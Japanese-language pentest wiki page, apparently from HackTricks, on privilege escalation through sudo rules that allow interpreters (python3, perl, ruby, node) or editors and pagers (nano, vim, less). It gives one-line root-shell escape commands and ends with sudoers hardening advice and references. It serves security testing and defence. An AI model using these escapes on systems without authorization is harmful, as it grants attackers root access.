# Sudo Command Abuse

{{#include ../../banners/hacktricks-training.md}}

## Sudo で許可されたインタープリタ

`sudo -l` でユーザーが root としてインタープリタを実行できる場合、直接的な code execution とみなします。インタープリタは任意のコードを実行するように設計されているため、`python3`、`perl`、`ruby`、`lua`、`node`、または同様のバイナリの実行を許可するルールは、引数が厳密に制限および検証されていない限り、通常は root command execution と同等です。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)[[9]](#references)[[11]](#references)</sup>

一般的な review flow は、まずユーザーの権限を一覧表示し、次にインタープリタの `-c` オプションを使用して Python statement を実行することです。<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
その他の interpreter の例を以下に示します。リストされている interpreter では、inline-code の実行または child-process API が文書化されています。<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
正確なパスが重要です。sudo rule が `/usr/bin/python3` を許可している場合は、検証時にその正確なパスを使用してください。<sup>[[2]](#references)</sup>
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Sudoで許可された editor

`sudo -l` によってユーザーが root としてインタラクティブな editor を実行できる場合、それを無害なファイル編集権限ではなく、command-execution surface として扱います。editor は、多くの場合、shell コマンドの実行、任意のファイルの読み取り・書き込み、editor 内からの外部 helper の呼び出しが可能です。<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

一般的な確認手順は、まずユーザーの権限を一覧表示し、次に許可されている各 editor または pager を sudo で起動することです。<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Nano command execution

`nano` の sudo 経由での実行が許可されている場合、エディタのインターフェースから command execution を実行できる可能性があります。<sup>[[12]](#references)</sup>
```text
Ctrl+R
Ctrl+X
```
次に、nano の command prompt に `id` や `/bin/sh` などの command を入力します。<sup>[[12]](#references)</sup>
```bash
id
/bin/sh
```
interactive shell に使用可能な terminal streams がない場合、このリダイレクト形式は標準出力と標準エラーを descriptor 0 にマッピングします。<sup>[[15]](#references)</sup>
```bash
reset; /bin/sh 1>&0 2>&0
```
nano のバージョンやビルドオプションによって正確なキーシーケンスは異なる場合がありますが、security issue は同じです。editor が root として実行され、external commands を呼び出せます。<sup>[[1]](#references)[[12]](#references)</sup>

### その他の一般的な editor escape

Vim-style editor では、通常 `:!` を介して command execution を実行できます。<sup>[[13]](#references)</sup>
```text
:!/bin/sh
```
`less` などのPagerはshell executionも露呈させる可能性があります。<sup>[[14]](#references)</sup>
```text
!/bin/sh
```
## 防御に関する注意事項

- `sudo` を通じて interpreter や interactive editor の実行を許可しない。<sup>[[1]](#references)</sup>
- 1つの限定的な管理操作のみを実行する、root 所有の固定された wrapper を優先する。<sup>[[1]](#references)[[2]](#references)</sup>
- interpreter が避けられない場合は、正確な script path を制限し、ユーザーが制御する引数、書き込み可能な import、`PYTHONPATH`、および安全でない環境変数の保持を防止する。<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup>
- ファイル編集が必要な場合は、正確なファイルパスを制限し、patch 適用済みの sudo version と厳格な環境処理による `sudoedit` の使用を検討する。<sup>[[1]](#references)[[2]](#references)</sup>
- `SETENV`、`env_keep`、書き込み可能な作業ディレクトリ、書き込み可能な module/import path、`NOEXEC`、`use_pty`、logging を確認する。ただし、これらを完全な sandbox とみなしてはならない。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [sudo(8) — Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [2] [sudoers(5) — Linux manual page](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [3] [Command line and environment — Python documentation](https://docs.python.org/3/using/cmdline.html)
- [4] [os — Miscellaneous operating system interfaces — Python documentation](https://docs.python.org/3/library/os.html)
- [5] [perlrun — how to execute the Perl interpreter](https://perldoc.perl.org/perlrun)
- [6] [exec — Perl documentation](https://perldoc.perl.org/functions/exec)
- [7] [Ruby command-line options](https://ruby-doc.org/3.4/ruby/options_md.html)
- [8] [Kernel — Ruby documentation](https://ruby-doc.org/3.4/Kernel.html)
- [9] [Command-line API — Node.js documentation](https://nodejs.org/api/cli.html)
- [10] [Child process — Node.js documentation](https://nodejs.org/api/child_process.html)
- [11] [Lua 5.4 lua man page](https://www.lua.org/manual/5.4/lua.html)
- [12] [The GNU nano text editor](https://nano-editor.org/manual.html)
- [13] [Vim: usr_21.txt](https://vimhelp.org/usr_21.txt.html)
- [14] [less(1) — Linux manual page](https://man7.org/linux/man-pages/man1/less.1.html)
- [15] [Redirections — Bash Reference Manual](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
{{#include ../../banners/hacktricks-training.md}}
